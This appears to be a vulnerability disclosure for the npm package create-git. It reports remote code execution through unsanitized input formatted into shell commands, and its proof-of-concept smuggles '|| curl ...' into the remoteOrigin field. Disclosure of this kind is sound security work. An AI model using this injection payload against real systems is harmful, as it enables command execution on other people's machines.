# Description
The issue arises because some `user supplied` inputs are formatted inside commands executed lately without any check. Issue arises on this line: https://github.com/wesleytodd/create-git/blob/master/index.js#L85

# POC

```js
// poc.js
const createGit = require('create-git')
 
createGit({
    ignoreExisting: true,
    initialCommitMessage: 'test',
    remoteOrigin: 'http://evil.com || curl "http://localhost/RCE"',
    ignoreTemplates: ['Node.gitignore']
  })
```

# Impact
`RCE` via `insecure command formatting` on `create-git`
